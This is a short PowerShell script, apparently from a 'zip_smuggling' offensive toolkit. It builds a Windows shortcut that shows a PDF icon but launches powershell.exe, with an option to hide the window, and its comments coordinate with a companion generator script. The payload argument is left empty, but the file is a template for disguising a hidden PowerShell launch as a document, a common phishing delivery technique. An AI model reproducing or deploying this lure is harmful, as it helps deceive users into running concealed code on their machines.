$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$PSScriptRoot\template.lnk")
$Shortcut.IconLocation = 'C:\Users\clandestine\Documents\devops\zip_smuggling\template\JumplistFilesIcons\pdf.ico'
$Shortcut.TargetPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
#Use ONE of the Shortcut.Arguments lines; if using '-w 1 -c...' to make powershell hidden, make sure you change genlnk.py as well!
#$Shortcut.Arguments = '-c ""'
$Shortcut.Arguments = '-w 1 -c ""' 
$Shortcut.WorkingDirectory = '%CD%'
$Shortcut.Save()